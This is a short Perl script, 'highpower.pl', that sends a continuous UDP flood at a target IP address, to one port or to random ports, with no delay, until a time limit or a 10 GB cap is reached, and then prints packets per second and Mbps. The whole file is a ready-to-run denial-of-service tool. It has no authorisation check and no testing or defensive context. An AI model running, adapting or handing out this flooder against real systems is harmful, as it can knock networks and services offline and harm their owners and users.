#!/usr/bin/perl
use strict;
use warnings;
use Socket qw(inet_aton sockaddr_in PF_INET SOCK_DGRAM IPPROTO_UDP);
use Time::HiRes qw(time);

# Check arguments count
if (@ARGV < 3) {
    print "Usage: perl highpower.pl <ip> <port|0=random> <seconds> [packet_size=1400] [max_bytes=10737418240]\n";
    exit(1);
}

my ($ip, $port, $seconds, $packet_size, $max_bytes) = @ARGV;

# Defaults
$packet_size ||= 1400;            # Safe default for UDP packet size
$max_bytes ||= 10 * 1024 * 1024 * 1024; # 10 GB

# Resolve IP
my $iaddr = inet_aton($ip) or die "Could not resolve host: $ip\n";

# Create socket
socket(SOCKET, PF_INET, SOCK_DGRAM, IPPROTO_UDP) or die "Socket creation failed: $!";

my $start = time();
my $end = $start + $seconds;
my $total_sent = 0;
my $packets = 0;

# Generate payload of desired size
my $payload = 'X' x $packet_size;

print ">> Flooding $ip on port " . ($port ? $port : "random") .
      " with $packet_size-byte UDP packets for $seconds seconds or max $max_bytes bytes...\n";

while (time() <= $end && $total_sent < $max_bytes) {
    my $target_port = $port ? $port : int(rand(65535)) + 1;

    my $sent = send(SOCKET, $payload, 0, sockaddr_in($target_port, $iaddr));
    if ($sent) {
        $total_sent += $sent;
        $packets++;
    } else {
        warn "Send failed: $!";
    }

    # No sleep for max throughput, but can add usleep(100) for slight delay if needed
}

my $duration = time() - $start || 1; # avoid division by zero
my $mbps = ($total_sent * 8) / (1024 * 1024 * $duration);
my $pps = $packets / $duration;

printf ">> DONE: Sent %.2f MB in %.2f seconds (%.2f Mbps, %.0f packets per second)\n",
       $total_sent / (1024 * 1024), $duration, $mbps, $pps;